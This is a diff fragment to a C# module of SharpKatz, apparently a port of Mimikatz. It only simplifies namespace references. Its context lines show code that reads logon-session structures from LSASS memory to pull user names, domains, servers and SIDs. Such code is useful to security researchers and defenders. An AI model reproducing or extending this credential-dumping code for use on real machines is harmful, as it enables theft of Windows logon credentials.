@@ -4,6 +4,7 @@ using System.Collections.Generic;
 using System.Reflection;
 using System.Runtime.InteropServices;
 using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;
+using static SharpKatz.Win32.Natives;
 
 namespace SharpKatz.Module
 {
@@ -93,7 +94,7 @@ namespace SharpKatz.Module
                         LogonTime = Utility.ReadStructFromLocalPtr<FILETIME>(IntPtr.Add(listentry, oshelper.LogonTimeOffset + 4))
                     };
 
-                    Natives.LUID luid = Utility.ReadStructFromLocalPtr<Natives.LUID>(logonsession.LogonId);
+                    LUID luid = Utility.ReadStructFromLocalPtr<LUID>(logonsession.LogonId);
 
                     IntPtr pUserName = IntPtr.Add(pList, oshelper.UserNameListOffset);
                     IntPtr pLogonDomain = IntPtr.Add(pList, oshelper.DomaineOffset);
@@ -103,7 +104,7 @@ namespace SharpKatz.Module
                     logonsession.LogonDomain = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pLogonDomain));
                     logonsession.LogonServer = Utility.ExtractUnicodeStringString(hLsass, Utility.ExtractUnicodeString(hLsass, pLogonServer));
 
-                    Natives.ConvertSidToStringSid(Utility.ExtractSid(hLsass, logonsession.pSid), out string stringSid);
+                    ConvertSidToStringSid(Utility.ExtractSid(hLsass, logonsession.pSid), out string stringSid);
 
                     Logon logon = new Logon(luid)
                     {
